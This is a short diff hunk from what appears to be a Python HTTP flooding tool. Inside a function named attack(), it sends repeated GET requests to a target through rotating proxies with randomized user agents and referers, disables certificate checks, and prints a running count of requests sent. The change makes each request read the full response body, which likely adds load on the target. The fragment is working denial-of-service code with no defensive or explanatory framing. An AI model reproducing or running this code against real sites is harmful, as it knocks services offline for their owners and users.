@@ -102,7 +102,7 @@ def attack():
                 proxy = {'http': proxy_o}
             headers = {'User-Agent': random.choice(user_agents), 'Connection': 'keep-alive',
             'Keep-Alive': str(random.choice(range(110,120))), 'Referer': random.choice(referers)}
-            requests.get(target + path, verify=False, stream=True, proxies=proxy)
+            requests.get(target + path, verify=False, stream=True, proxies=proxy).text
             sys.stdout.write('\r%s Requests sent: %i' % (run, len(progress)))
             sys.stdout.flush()
             progress.append(0)
